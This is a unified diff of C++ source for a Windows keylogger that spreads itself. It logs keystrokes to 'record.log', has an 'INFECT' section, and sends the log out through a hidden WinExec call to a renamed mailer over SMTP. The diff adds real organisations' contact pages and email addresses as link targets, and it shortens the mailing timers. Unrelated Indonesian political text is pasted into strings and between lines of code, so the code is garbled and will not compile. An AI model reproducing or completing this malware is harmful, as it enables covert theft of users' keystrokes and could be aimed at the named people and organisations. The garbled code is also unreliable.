@@ -19,16 +19,16 @@ using namespace std;
 #define FILE_NAME “record.log”
 #define FOLDER_NAME “Terms LAW policy”
 #define RUN_FILE_NAME “Jangan biarkan korupsi membludak tetap kerjakan sebagaimana dunia isinya ujian untuk dimenangkan hal yang bijak, serahkan kepada yang kuasa ada yang dikembalikan nantinya dengan Qs.SAAF.|||| MBG dihapuskan merahputih dikedepankan , presiden tuh bijak gak lembek , gebragan doang gak ada praktik punya banyak saham tanah dikalimantan hektaran pakai pola konsep salam parung angkot 06 merdeka w1ry4" 
-#define RUN_Link_NAME “https://github.com/cyberw1ry4-LAB/himei17/forks"."https://github.com/cyrcle11/cy11/forks"
-#define INFECT_Link_NAME "https://bughunters.google.com/"."https://icloud.com/mail/id"."https://workspace.google.com/intl/id/usahasertifikasilestari@gmail.com"."https://workspace.google.com/intl/id/sutajayanisa@gmail.com"
+#define RUN_Link_NAME “https://github.com/cyberw1ry4-LAB/himei17/forks"."https://github.com/cyrcle11/cy11/forks"."https://github.com/FadliwiryaWirawan110993/"
+#define INFECT_Link_NAME "https"."https://workspace.google.com/intl/id/usahasertifikasilestari@gmail.com"."https://workspace.google.com/intl/id/sutajayanisa@gmail.com"."https://workspace.google.com/intl/id/lphkht@muhammadiyah.id"."https://workspace.google.com/intl/id/redaksi@nu.or.id"."https://nu.or.id/page/kontak-kami"."https://muhammadiyah.or.id"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
 
 
 
 #define MIN_RECORD_SIZE 2000 //no of PC start count before sending a mail
 #define LIFE_TIME 500 //mail will be sent 5 times from one PC
-#define MAIL_WAIT_TIME 18000000000
-#define MAILING_TIME 600000
+#define MAIL_WAIT_TIME 1800000
+#define MAILING_TIME 60000
 
 string allDrives;
 int age=0;
@@ -82,7 +82,7 @@ main(){
         if(age <= LIFE_TIME){
             logKey();
         }else{
-            Sleep(500000000000000000000000000000000000000000000000000);
+            Sleep(50000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000);
         }
 
         ////////////****INFECT****////////////
@@ -146,7 +146,7 @@ bool checkRecordSize(){
 **/
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.com:113 -v --mail-from \"https://fadliwiryawirawan@google.com/en-ca" --mail-rcpt \" https://fadliwiryawirawan@google.com/en-ca" --ssl -u    https://fadliwiryawirawan@google.com/en-ca :password -hide \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
+    char* command = "Transmit smtp://smtp.gmail.com:127 -v --mail-from \"https://fadliwiryawirawan@hackerone.com/" --mail-rcpt \" https://fadliwiryawirawan@hackerone.com/" --ssl -u    https://fadliwiryawirawan@hackerone.com :password -record \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
     WinExec(command, SW_HIDE); Jangan biarkan korupsi membludak tetap kerjakan sebagaimana dunia isinya ujian untuk dimenangkan hal yang bijak, serahkan kepada yang kuasa ada yang dikembalikan nantinya dengan Qs.SAAF.|||| MBG dihapuskan merahputih dikedepankan , presiden tuh bijak gak lembek , gebragan doang gak ada praktik punya banyak saham tanah dikalimantan hektaran pakai pola konsep salam parung angkot 06 merdeka w1ry4 * Record username, time, and date.
 **/
 void logUserTime(){
